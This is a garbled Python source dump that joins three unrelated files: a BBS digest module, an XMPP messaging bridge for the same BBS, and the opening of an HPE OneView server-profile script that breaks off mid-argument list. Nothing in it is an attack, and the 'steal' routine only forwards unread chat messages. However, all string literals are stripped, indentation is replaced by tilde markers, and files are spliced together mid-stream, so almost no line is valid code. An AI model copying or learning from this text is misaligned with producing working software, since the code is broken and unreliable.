if ( _id >= len ( parent . items ) ) : \n 
~~~ return [ ] \n 
~~ while ( parent . items [ _id ] . EffectiveId ( user ) < target ) : \n 
~~~ _id += 1 \n 
if ( _id >= len ( parent . items ) ) : \n 
# give partial result instead of error... \n 
~~~ return result \n 
~~ ~~ item = parent . items [ _id ] \n 
# necessary?... \n 
item . mtitle = item . title \n 
result += [ item ] \n 
\n 
~~ return result \n 
\n 
~~ def EffectiveId ( self , user ) : \n 
~~~ _id = self . id \n 
if ( user . IsSysop ( ) ) : \n 
~~~ return _id \n 
~~ if ( not user . IsSysop ( ) ) : \n 
~~~ _id -= self . sysop_only \n 
~~ if ( not user . IsBM ( ) ) : \n 
~~~ _id -= self . bms_only \n 
~~ if ( not user . IsSECANC ( ) ) : \n 
~~~ _id -= self . zixia_only \n 
~~ return _id \n 
\n 
~~ def GetInfo ( self ) : \n 
~~~ info = { } \n 
info [ ] = Util . gbkDec ( self . mtitle ) \n 
info [ ] = Util . gbkDec ( self . title ) \n 
info [ ] = self . attachpos \n 
if ( self . host != ) : \n 
~~~ info [ ] = self . host \n 
info [ ] = self . port \n 
info [ ] = \n 
~~ elif ( self . IsDir ( ) ) : \n 
~~~ info [ ] = \n 
~~ elif ( self . IsFile ( ) ) : \n 
~~~ info [ ] = \n 
~~ else : \n 
~~~ info [ ] = \n 
~~ info [ ] = int ( self . GetModTime ( ) ) \n 
return info \n 
\n 
~~ def GetInfoForUser ( self , user ) : \n 
~~~ info = self . GetInfo ( ) \n 
info [ ] = self . EffectiveId ( user ) + 1 \n 
return info \n 
\n 
~~ def GetAttachLink ( self , session ) : \n 
~~~ _hash = Util . HashGen ( self . path ( ) , "python nb" ) \n 
filename = \n 
for i in range ( 2 ) : \n 
~~~ filename += "%0x" % struct . unpack ( , _hash [ i * 4 : ( i + 1 ) * 4 ] ) \n 
~~ link = "http://%s/bbscon.php?b=xattach&f=%s" % ( session . GetMirror ( Config . Config . GetInt ( , 80 ) ) , filename ) \n 
\n 
linkfile = "%s/boards/xattach/%s" % ( Config . BBS_ROOT , filename ) \n 
target = "../../%s" % self . path ( ) \n 
try : \n 
~~~ os . symlink ( target , linkfile ) \n 
~~ except : \n 
# we should not omit other errors \n 
# anyway... \n 
~~~ pass \n 
~~ return link \n 
\n 
~~ ~~ class Digest : \n 
~~~ root = DigestItem ( "0Announce" ) \n 
def __init__ ( self , board , path ) : \n 
~~~ self . board = board \n 
self . path = path \n 
self . root = DigestItem ( self . path ) \n 
\n 
~~ @ staticmethod \n 
def GET ( svc , session , params , action ) : \n 
~~~ if ( session is None ) : raise Unauthorized ( ) \n 
if not session . CheckScope ( ) : raise NoPerm ( "out of scope" ) \n 
user = session . GetUser ( ) \n 
boardname = svc . get_str ( params , , ) \n 
if ( boardname ) : \n 
~~~ board = BoardManager . BoardManager . GetBoard ( boardname ) \n 
if ( board is None ) : raise NotFound ( % boardname ) \n 
if ( not board . CheckReadPerm ( user ) ) : \n 
~~~ raise NoPerm ( ) \n 
~~ basenode = board . digest . root \n 
has_perm = user . IsDigestMgr ( ) or user . IsSysop ( ) or user . IsSuperBM ( ) \n 
~~ else : \n 
~~~ basenode = Digest . root \n 
has_perm = user . IsDigestMgr ( ) \n 
\n 
~~ if ( action == "list" ) : \n 
~~~ route = svc . get_str ( params , ) \n 
start = svc . get_int ( params , , 1 ) \n 
end = svc . get_int ( params , , start + DEFAULT_DIGEST_LIST_COUNT - 1 ) \n 
Digest . List ( svc , basenode , route , start , end , session , has_perm ) \n 
return \n 
~~ elif ( action == "view" ) : \n 
~~~ route = svc . get_str ( params , ) \n 
start = svc . get_int ( params , , 0 ) \n 
count = svc . get_int ( params , , 0 ) \n 
Digest . View ( svc , basenode , route , session , has_perm , start , count ) \n 
return \n 
~~ else : \n 
~~~ raise WrongArgs ( % action ) \n 
\n 
~~ ~~ @ staticmethod \n 
def ParseRoute ( route ) : \n 
~~~ ret = [ ] \n 
items = re . split ( , route ) \n 
\n 
items = items [ 1 : ] \n 
for item in items : \n 
~~~ try : \n 
~~~ ret += [ int ( item ) ] \n 
~~ except : \n 
~~~ raise WrongArgs ( % item ) \n 
~~ ~~ return ret \n 
\n 
~~ @ staticmethod \n 
def List ( svc , basenode , route , start , end , session , has_perm ) : \n 
~~~ route_array = Digest . ParseRoute ( route ) \n 
parent = basenode . GetItem ( session . GetUser ( ) , route_array , has_perm ) \n 
if ( not parent ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ if ( not parent . IsDir ( ) ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ items = basenode . GetRange ( session . GetUser ( ) , route_array , start , end , has_perm ) \n 
result = { } \n 
result [ ] = parent . GetInfoForUser ( session . GetUser ( ) ) \n 
result [ ] = len ( items ) \n 
result_list = [ ] \n 
for item in items : \n 
~~~ result_list += [ item . GetInfoForUser ( session . GetUser ( ) ) ] \n 
~~ result [ ] = result_list \n 
\n 
svc . writedata ( json . dumps ( result ) ) \n 
\n 
~~ @ staticmethod \n 
def View ( svc , basenode , route , session , has_perm , start , count ) : \n 
~~~ route_array = Digest . ParseRoute ( route ) \n 
item = basenode . GetItem ( session . GetUser ( ) , route_array , has_perm ) \n 
if ( not item ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ if ( not item . IsFile ( ) ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ result = { } \n 
result [ ] = item . GetInfoForUser ( session . GetUser ( ) ) \n 
postinfo = Post . Post ( item . realpath ( ) , None ) \n 
( result [ ] , result [ ] ) = postinfo . GetContent ( start , count ) \n 
attachlist = postinfo . GetAttachListByType ( ) \n 
result [ ] = attachlist [ 0 ] \n 
result [ ] = attachlist [ 1 ] \n 
if ( attachlist [ 0 ] or attachlist [ 1 ] ) : \n 
~~~ result [ ] = item . GetAttachLink ( session ) \n 
~~ svc . writedata ( json . dumps ( result ) ) \n 
\n 
\n 
~~ ~~ import time \n 
\n 
import UserManager \n 
import UserInfo \n 
from Session import Session \n 
from Log import Log \n 
import UCache \n 
import Config \n 
import MsgBox \n 
import xmpp \n 
import modes \n 
import Util \n 
import traceback \n 
import os \n 
from xmpp . features import NoRoute \n 
\n 
__disco_info_ns__ = \n 
__disco_items_ns__ = \n 
__vcard_ns__ = \n 
\n 
STEAL_AFTER_SEEN = 3 \n 
\n 
def elem_to_str ( elem ) : \n 
~~~ return "<%r %r>%r</>" % ( elem . tag , elem . attrib , elem . text ) \n 
\n 
~~ class XMPPServer ( xmpp . Plugin ) : \n 
~~~ """XMPP server for the BBS""" \n 
\n 
def __init__ ( self , rosters , host ) : \n 
~~~ self . probed = False \n 
self . _closed = False \n 
self . rosters = rosters \n 
self . _session = None \n 
\n 
self . rosters . set_resources ( self . get_resources ( ) ) \n 
\n 
self . _fixedjid = UCache . UCache . formalize_jid ( unicode ( self . authJID ) ) \n 
self . _userid = self . _fixedjid . partition ( ) [ 0 ] . encode ( "gbk" ) \n 
\n 
if ( not self . rosters . allow_login ( self . authJID . bare ) ) : \n 
~~~ Log . warn ( "user %s login denied" % self . _userid ) \n 
#            self.unbind_res() \n 
self . stream_error ( , ) \n 
return \n 
~~ Log . info ( "%s: session start" % unicode ( self . authJID ) ) \n 
\n 
if self . authJID . resource [ : - 8 ] != "Resource" and len ( self . authJID . resource ) > 8 : \n 
~~~ try : \n 
~~~ routes = self . routes ( self . authJID . bare ) \n 
for route in routes : \n 
~~~ jid = route [ 0 ] \n 
if jid . resource [ : - 8 ] == self . authJID . resource [ : - 8 ] : \n 
~~~ if jid . resource != self . authJID . resource : \n 
# old resource! \n 
~~~ Log . info ( "old jid: %s %r" % ( jid . full , route [ 1 ] ) ) \n 
route [ 1 ] . stream_error ( , ) \n 
~~ ~~ else : \n 
~~~ Log . info ( "another me: %s %r" % ( jid . full , route [ 1 ] ) ) \n 
~~ ~~ ~~ except NoRoute : \n 
~~~ pass \n 
~~ Log . debug ( "%s: checked for old sessions" % self . authJID . full ) \n 
\n 
# Login the user \n 
~~ self . _user = UserManager . UserManager . LoadUser ( self . _userid ) \n 
if ( self . _user == None ) : \n 
~~~ raise Exception ( "How can that be!" ) \n 
~~ self . _peer_addr = self . getpeername ( ) \n 
self . _session = Session ( self . _user , self . _peer_addr [ 0 ] ) \n 
self . _session . RecordLogin ( ) \n 
# insert into global session list! \n 
self . _userinfo = self . _session . Register ( ) \n 
self . _loginid = self . _session . utmpent \n 
self . _hostname = host \n 
self . bind ( xmpp . ReceivedCloseStream , self . recv_close ) \n 
self . bind ( xmpp . StreamClosed , self . stream_closed ) \n 
self . bind ( xmpp . SentCloseStream , self . sent_close ) \n 
\n 
self . rosters . register_conn ( self ) \n 
\n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
if self . rosters . get_xmpp_read ( self . _user . GetUID ( ) ) is None : \n 
~~~ self . rosters . set_xmpp_read ( self . _user . GetUID ( ) , msgbox . GetMsgCount ( all = False ) - msgbox . GetUnreadCount ( ) ) \n 
~~ self . check_msg ( ) \n 
\n 
~~ def get_loginid ( self ) : \n 
~~~ return self . _loginid \n 
\n 
~~ def recv_close ( self ) : \n 
~~~ Log . debug ( "%s: close because he wants to" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def stream_closed ( self ) : \n 
~~~ Log . debug ( "%s: close because stream closed" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def sent_close ( self ) : \n 
~~~ Log . debug ( "%s: close because we want to" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def close ( self ) : \n 
~~~ if ( self . _closed ) : \n 
~~~ Log . debug ( "already closed. ignore" ) \n 
return \n 
~~ self . _closed = True \n 
Log . info ( "%s: session end" % unicode ( self . authJID ) ) \n 
if ( self . _session ) : \n 
~~~ self . _session . Unregister ( ) \n 
~~ self . unbind_res ( ) \n 
self . rosters . unregister_conn ( self ) \n 
\n 
~~ @ xmpp . iq ( ) \n 
def ping ( self , iq ) : \n 
~~~ """Handle ping requests""" \n 
\n 
self . refresh ( ) \n 
return self . iq ( , iq ) \n 
\n 
~~ @ xmpp . stanza ( ) \n 
def message ( self , elem ) : \n 
~~~ """Proxy message from one user to another""" \n 
\n 
# so, possible: \n 
# XMPP user -> Old user \n 
# XMPP user -> XMPP user => make it like XMPP->old \n 
\n 
# Old user -> XMPP user (emulated) => handled elsewhere \n 
\n 
to_jid = elem . get ( ) \n 
from_jid = elem . get ( ) \n 
if ( from_jid == None ) : \n 
~~~ return \n 
\n 
#       self.recv(to_jid, elem) \n 
\n 
~~ text_body = None \n 
for child in elem : \n 
~~~ if ( child . tag . endswith ( ) ) : \n 
~~~ text_body = child . text \n 
~~ ~~ if ( text_body == None ) : \n 
~~~ return \n 
\n 
~~ ret = self . rosters . send_msg ( from_jid , to_jid , text_body ) \n 
if ( ret <= 0 ) : \n 
~~~ Log . warn ( "sendmsg() failed to %s from %s error %d" % ( to_jid , from_jid , ret ) ) \n 
errors = { \n 
- 1 : "That user has locked screen, please send later." , \n 
- 11 : "That user denied your message." , \n 
- 12 : "That user has too many unread messages. Please send later." , \n 
- 13 : "User has gone after message sent." , \n 
- 14 : "User has gone before message sent." , \n 
- 2 : "User has gone before message sent." , \n 
- 21 : "Error when sending message!" } \n 
if ( ret in errors ) : \n 
~~~ elem = self . E . message ( { : to_jid , \n 
: from_jid , \n 
: } , \n 
self . E . body ( errors [ ret ] ) ) \n 
self . recv ( from_jid , elem ) \n 
# -2: no perm to see cloak \n 
# 0: error \n 
# -1: lockscreen \n 
# -11: blocked \n 
# -12: too many messages \n 
# -13: user gone when notifying \n 
# -14: user gone before saving \n 
# -21: error when saving message \n 
\n 
~~ ~~ ~~ def make_jid ( self , userid ) : \n 
~~~ return "%s@%s" % ( userid , self . _hostname ) \n 
\n 
~~ def refresh ( self ) : \n 
~~~ self . _userinfo . freshtime = int ( time . time ( ) ) \n 
self . _userinfo . save ( ) \n 
\n 
~~ def ping_result ( self , iq ) : \n 
~~~ self . refresh ( ) \n 
\n 
~~ def ping_client ( self ) : \n 
~~~ try : \n 
~~~ pingelem = self . E . ping ( xmlns = ) \n 
return self . iq ( , self . ping_result , pingelem ) \n 
~~ except Exception as e : \n 
~~~ Log . debug ( "ping client %r failed: %r" % ( self . authJID , e ) ) \n 
Log . debug ( traceback . format_exc ( ) ) \n 
return False \n 
\n 
~~ ~~ def get_uid ( self ) : \n 
~~~ return self . _user . GetUID ( ) \n 
\n 
~~ def recv_msg ( self , from_ , msgtext ) : \n 
# got a new message! send it! \n 
~~~ elem = self . E . message ( { : from_ , : unicode ( self . authJID ) } , \n 
self . E . body ( msgtext ) ) \n 
self . recv ( unicode ( self . authJID ) , elem ) \n 
\n 
~~ def check_msg ( self ) : \n 
~~~ Log . debug ( "checking msg for %s" % self . _userid ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
my_pid = os . getpid ( ) \n 
xmpp_read = self . rosters . get_xmpp_read ( self . _user . GetUID ( ) ) \n 
if xmpp_read > msg_count : \n 
~~~ xmpp_read = 0 \n 
~~ Log . debug ( "total: %d xmpp read: %d" % ( msg_count , xmpp_read ) ) \n 
self . rosters . set_xmpp_read ( self . _user . GetUID ( ) , msg_count ) \n 
if xmpp_read < msg_count : \n 
~~~ return xmpp_read \n 
~~ else : \n 
~~~ return - 1 \n 
\n 
~~ ~~ def deliver_msg ( self , start ) : \n 
~~~ Log . debug ( "deliver msg to %s" % unicode ( self . authJID ) ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
my_pid = os . getpid ( ) \n 
for i in range ( start , msg_count ) : \n 
~~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if msghead . topid == my_pid : \n 
~~~ msgtext = msgbox . LoadMsgText ( msghead ) \n 
self . recv_msg ( self . make_jid ( msghead . id ) , msgtext ) \n 
\n 
~~ ~~ ~~ def steal_msg ( self ) : \n 
~~~ Log . debug ( "stealing msg for %s" % self . _userid ) \n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
msg_count = msgbox . GetMsgCount ( all = False ) \n 
msg_unread = msgbox . GetUnreadCount ( ) \n 
read_count = msg_count - msg_unread \n 
my_pid = os . getpid ( ) \n 
term_read = self . rosters . get_term_read ( self . get_uid ( ) ) \n 
term_stealed = self . rosters . get_term_stealed ( self . get_uid ( ) ) \n 
\n 
all_xmpp = True \n 
new_unread = { } \n 
# these are unread msgs! \n 
for i in range ( read_count - 1 , msg_count ) : \n 
~~~ if i < 0 : # read_count == 0... \n 
~~~ continue \n 
\n 
~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if i >= read_count and all_xmpp : \n 
~~~ if msghead . topid == my_pid : \n 
# still xmpp \n 
# RACE! \n 
~~~ msgbox . GetUnreadMsg ( ) \n 
~~ else : \n 
# not xmpp \n 
~~~ all_xmpp = False \n 
\n 
~~ ~~ if msghead . topid == my_pid : \n 
\n 
~~~ continue \n 
\n 
~~ if i < read_count : # read_count - 1 \n 
~~~ session = self . rosters . find_session ( self . authJID . bare , msghead . topid ) \n 
if session is None or session . get_mode ( ) != modes . MSG : \n 
~~~ continue \n 
~~ Log . debug ( "considered msg %d as unread" % i ) \n 
\n 
# unread msg! \n 
~~ if msghead . topid not in new_unread : \n 
~~~ Log . debug ( "for pid %d, first unread at %d" % ( msghead . topid , i ) ) \n 
new_unread [ msghead . topid ] = i \n 
\n 
~~ ~~ final_unread = { } \n 
to_steal = { } \n 
to_steal_begin = msg_count \n 
\n 
for pid in term_read : \n 
~~~ if pid in new_unread : \n 
~~~ if new_unread [ pid ] == term_read [ pid ] [ 0 ] : \n 
# still unread \n 
~~~ final_unread [ pid ] = ( term_read [ pid ] [ 0 ] , term_read [ pid ] [ 1 ] + 1 ) \n 
Log . debug ( ".. still unread: %d for %d, %d times" % ( new_unread [ pid ] , pid , term_read [ pid ] [ 1 ] + 1 ) ) \n 
if final_unread [ pid ] [ 1 ] > STEAL_AFTER_SEEN : \n 
~~~ to_steal [ pid ] = final_unread [ pid ] \n 
Log . debug ( ".. let\'s steal! %d+ from %d" % ( to_steal [ pid ] [ 0 ] , pid ) ) \n 
if pid in term_stealed : \n 
~~~ steal_begin = max ( final_unread [ pid ] [ 0 ] , term_stealed [ pid ] + 1 ) \n 
~~ else : \n 
~~~ steal_begin = final_unread [ pid ] [ 0 ] \n 
~~ if steal_begin < to_steal_begin : \n 
~~~ to_steal_begin = steal_begin \n 
~~ ~~ ~~ else : \n 
# moved forward \n 
~~~ final_unread [ pid ] = ( new_unread [ pid ] , 1 ) \n 
Log . debug ( ".. moved: %d->%d for %d" % ( term_read [ pid ] [ 0 ] , new_unread [ pid ] , pid ) ) \n 
~~ ~~ else : \n 
# disappeared? consider as read \n 
~~~ Log . debug ( ".. disappeared: %d" % pid ) \n 
pass \n 
~~ ~~ for pid in new_unread : \n 
~~~ if pid not in term_read : \n 
# new session \n 
~~~ Log . debug ( ".. new unread: %d for %d" % ( new_unread [ pid ] , pid ) ) \n 
final_unread [ pid ] = ( new_unread [ pid ] , 1 ) \n 
\n 
~~ ~~ if to_steal : \n 
~~~ Log . debug ( "steal starting from %d" % to_steal_begin ) \n 
for i in range ( to_steal_begin , msg_count ) : \n 
~~~ msghead = msgbox . LoadMsgHead ( i , all = False ) \n 
if msghead . topid == my_pid : \n 
~~~ Log . debug ( "skip xmpp %d for %d" % ( i , msghead . topid ) ) \n 
msgbox . GetUnreadMsg ( ) \n 
~~ elif msghead . topid in to_steal : \n 
~~~ if msghead . topid not in term_stealed or i > term_stealed [ msghead . topid ] : \n 
~~~ Log . debug ( "steal! %d from %d" % ( i , msghead . topid ) ) \n 
# not stealed... \n 
msgtext = msgbox . LoadMsgText ( msghead ) \n 
self . recv_msg ( self . make_jid ( msghead . id ) , msgtext ) \n 
term_stealed [ msghead . topid ] = i \n 
~~ else : \n 
~~~ Log . debug ( "already stealed: %d from %d" % ( i , msghead . topid ) ) \n 
\n 
~~ ~~ ~~ ~~ self . rosters . set_term_read ( self . get_uid ( ) , final_unread ) \n 
\n 
~~ @ xmpp . stanza ( ) \n 
def presence ( self , elem ) : \n 
~~~ """Presence information may be sent out from the client or\n        received from another account.""" \n 
\n 
Log . warn ( "handle presence. me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
if self . authJID == elem . get ( ) : \n 
~~~ if ( elem . get ( ) == None or ( not self . authJID . match_bare ( elem . get ( ) ) ) ) : \n 
~~~ return self . send_presence ( elem ) \n 
~~ ~~ self . recv_presence ( elem ) \n 
\n 
~~ def send_presence ( self , elem ) : \n 
~~~ Log . warn ( "send_presence me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
# we want to send a presence \n 
direct = elem . get ( ) \n 
if not direct : \n 
# not sending directly to one JID \n 
# send to everyone who is watching me \n 
~~~ self . rosters . broadcast ( self , elem ) \n 
if elem . get ( ) != : \n 
# if it is not a probe, send a copy to the client also \n 
~~~ self . recv_presence ( elem ) \n 
~~ if not self . probed : \n 
# if we have not probed our watch list, probe them \n 
~~~ self . probed = True \n 
self . rosters . probe ( self ) \n 
# check if rosters will handle this  \n 
~~ ~~ elif not self . rosters . send ( self , direct , elem ) : \n 
# if not, send it to the JID specified \n 
~~~ self . send ( direct , elem ) \n 
\n 
~~ ~~ def recv_presence ( self , elem ) : \n 
~~~ Log . warn ( "recv_presence me: %r elem: %r" % ( self . authJID , elem_to_str ( elem ) ) ) \n 
# we got a precense \n 
# check if rosters will handle this \n 
if not self . rosters . recv ( self , elem ) : \n 
# if not, send this to the client \n 
~~~ Log . warn ( "\\tsending it to client" ) \n 
self . write ( elem ) \n 
\n 
~~ ~~ @ xmpp . iq ( ) \n 
def roster ( self , iq ) : \n 
~~~ """A roster is this account\'s list of contacts; it may be\n        fetched or updated.""" \n 
\n 
roster = self . rosters . get ( self ) \n 
method = getattr ( self , % iq . get ( ) ) \n 
return method and method ( iq , roster ) \n 
\n 
~~ def get_roster ( self , iq , roster ) : \n 
~~~ query = self . E . query ( { : } ) \n 
for item in roster . items ( ) : \n 
~~~ query . append ( item ) \n 
~~ return self . iq ( , iq , query ) \n 
\n 
~~ def set_roster ( self , iq , roster ) : \n 
~~~ query = self . E . query ( xmlns = ) \n 
for item in iq [ 0 ] : \n 
~~~ result = roster . set ( item ) \n 
if result is not None : \n 
~~~ query . append ( result ) \n 
~~ ~~ if len ( query ) > 0 : \n 
~~~ self . push ( roster , query ) \n 
~~ return self . iq ( , iq ) \n 
\n 
~~ def push ( self , roster , query ) : \n 
~~~ """Push roster changes to all clients that have requested this\n        roster.""" \n 
\n 
for jid in roster . requests ( ) : \n 
~~~ for ( to , route ) in self . routes ( jid ) : \n 
~~~ route . iq ( , self . ignore , query ) \n 
\n 
~~ ~~ ~~ def ignore ( self , iq ) : \n 
~~~ """An IQ no-op.""" \n 
\n 
~~ @ xmpp . iq ( ) \n 
def vcard ( self , iq ) : \n 
~~~ """vCard support: the client requests its vCard after\n        establishing a session.""" \n 
\n 
if iq . get ( ) == : \n 
~~~ if ( iq . get ( ) == None ) : \n 
~~~ target = iq . get ( ) \n 
~~ else : \n 
~~~ target = iq . get ( ) \n 
\n 
~~ form_target = UCache . UCache . formalize_jid ( target ) \n 
name = form_target . partition ( ) [ 0 ] \n 
user = UserManager . UserManager . LoadUser ( name ) \n 
info = user . GetInfo ( ) \n 
desc = % ( info [ ] , info [ ] , info [ ] , \n 
info [ ] , info [ ] , info [ ] , info [ ] ) \n 
if ( in info ) : \n 
~~~ desc += "Plan:\\r%s" % ( info [ ] . replace ( , ) ) \n 
\n 
~~ vcard = self . E . vCard ( { : } , \n 
self . E ( , name ) , \n 
self . E ( , Util . Util . RemoveTags ( info [ ] ) ) , \n 
self . E ( , Util . Util . RemoveTags ( desc ) ) ) \n 
\n 
if ( iq . get ( ) == None ) : \n 
~~~ return self . iq ( , iq , vcard ) \n 
~~ else : \n 
~~~ return self . iq ( , iq , vcard , { : iq . get ( ) } ) \n 
\n 
~~ ~~ ~~ @ xmpp . iq ( % __disco_info_ns__ ) \n 
def disco_info ( self , iq ) : \n 
~~~ """ Service Discovery: disco#info """ \n 
\n 
target = iq . get ( ) \n 
\n 
if ( target . find ( ) < 0 ) : \n 
# query server info \n 
~~~ query = self . E . query ( { : __disco_info_ns__ } , \n 
self . E . identity ( { : , \n 
: , \n 
: Config . Config . GetString ( , ) , \n 
} ) ) \n 
features = [ __disco_info_ns__ , __disco_items_ns__ , __vcard_ns__ ] \n 
for feature in features : \n 
~~~ query . append ( self . E . feature ( { : feature } ) ) \n 
\n 
~~ ~~ else : \n 
# query client info \n 
~~~ query = self . E . query ( { : __disco_info_ns__ } , \n 
self . E . identity ( { : , \n 
: , \n 
: Config . Config . GetString ( , ) , \n 
} ) ) \n 
\n 
features = [ __disco_info_ns__ , __disco_items_ns__ , __vcard_ns__ ] \n 
for feature in features : \n 
~~~ query . append ( self . E . feature ( { : feature } ) ) \n 
\n 
~~ ~~ return self . iq ( , iq , query , { : target } ) \n 
\n 
\n 
~~ @ xmpp . iq ( % __disco_items_ns__ ) \n 
def disco_items ( self , iq ) : \n 
~~~ """ Service Discovery: disco#items """ \n 
\n 
target = iq . get ( ) \n 
\n 
if ( target . find ( ) < 0 ) : \n 
# query server info \n 
~~~ query = self . E . query ( { : __disco_items_ns__ } ) \n 
\n 
~~ else : \n 
# query client info \n 
~~~ query = self . E . query ( { : __disco_items_ns__ } ) \n 
\n 
~~ return self . iq ( , iq , query , { : target } ) \n 
\n 
\n 
#!/usr/bin/env python \n 
### \n 
# (C) Copyright (2012-2016) Hewlett Packard Enterprise Development LP \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
### \n 
~~ ~~ from __future__ import print_function \n 
from __future__ import unicode_literals \n 
from __future__ import division \n 
from __future__ import absolute_import \n 
from builtins import range \n 
from future import standard_library \n 
standard_library . install_aliases ( ) \n 
import sys \n 
\n 
PYTHON_VERSION = sys . version_info [ : 3 ] \n 
PY2 = ( PYTHON_VERSION [ 0 ] == 2 ) \n 
if PY2 : \n 
~~~ if PYTHON_VERSION < ( 2 , 7 , 9 ) : \n 
~~~ raise Exception ( ) \n 
~~ ~~ elif PYTHON_VERSION < ( 3 , 4 ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ import hpOneView as hpov \n 
from pprint import pprint \n 
import json \n 
from hpOneView . common import uri \n 
import hpOneView . profile as profile \n 
\n 
\n 
def acceptEULA ( con ) : \n 
# See if we need to accept the EULA before we try to log in \n 
~~~ con . get_eula_status ( ) \n 
try : \n 
~~~ if con . get_eula_status ( ) is True : \n 
~~~ print ( ) \n 
con . set_eula ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print ( ) \n 
print ( e ) \n 
\n 
\n 
~~ ~~ def login ( con , credential ) : \n 
# Login with given credentials \n 
~~~ try : \n 
~~~ con . login ( credential ) \n 
~~ except : \n 
~~~ print ( ) \n 
\n 
\n 
~~ ~~ def get_eg_uri_from_arg ( srv , name ) : \n 
~~~ if srv and name : \n 
~~~ if name . startswith ( ) and uri [ ] in name : \n 
~~~ return name \n 
~~ else : \n 
~~~ egs = srv . get_enclosure_groups ( ) \n 
for eg in egs : \n 
~~~ if eg [ ] == name : \n 
~~~ return eg [ ] \n 
~~ ~~ ~~ ~~ return None \n 
\n 
\n 
~~ def get_sht_from_arg ( srv , name ) : \n 
~~~ if srv and name : \n 
~~~ if name . startswith ( ) and uri [ ] in name : \n 
~~~ return name \n 
~~ else : \n 
~~~ shts = srv . get_server_hardware_types ( ) \n 
for sht in shts : \n 
~~~ if sht [ ] == name : \n 
~~~ return sht \n 
~~ ~~ ~~ ~~ return None \n 
\n 
\n 
~~ def define_profile_template ( \n 
srv , \n 
name , \n 
desc , \n 
sp_desc , \n 
server_hwt , \n 
enc_group , \n 
affinity , \n 
hide_flexnics , \n 
conn_list , \n 
fw_settings , \n 
boot , \n 
bootmode ) : \n 
\n 
~~~ if conn_list : \n 
# read connection list from file \n 
~~~ conn = json . loads ( open ( conn_list ) . read ( ) ) \n 
~~ else : \n 
~~~ conn = [ ] \n 
\n 
~~ profile_template = srv . create_server_profile_template ( \n 
name = name , \n 
description = desc , \n 
serverProfileDescription = sp_desc , \n 
serverHardwareTypeUri = server_hwt , \n 
enclosureGroupUri = enc_group , \n 
affinity = affinity , \n 
hideUnusedFlexNics = hide_flexnics , \n 
profileConnectionV4 = conn , \n 
firmwareSettingsV3 = fw_settings , \n 
bootSettings = boot , \n 
bootModeSetting = bootmode ) \n 
\n 
if in profile_template : \n 
~~~ print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( , profile_template [ ] ) \n 
print ( ) \n 
for connection in profile_template [ ] : \n 
~~~ print ( , connection [ ] ) \n 
print ( , connection [ ] ) \n 
print ( , connection [ ] ) \n 
~~ print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( ) \n 
print ( , profile_template [ ] [ ] ) \n 
print ( , profile_template [ ] [ ] , ) \n 
~~ else : \n 
~~~ pprint ( profile_template ) \n 
\n 
\n 
~~ ~~ def main ( ) : \n 
~~~ parser = argparse . ArgumentParser ( add_help = True , \n 
formatter_class = argparse . RawTextHelpFormatter , \n 
description = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , required = True , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , choices = [ , ] , \n 
default = , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , choices = [ , ] , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
help = ) \n 
parser . add_argument ( , dest = , \n 
action = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
nargs = , \n 
help = ) \n 
parser . add_argument ( , dest = , required = False , \n 
choices = [ , , ] , \n 
default = , \n 
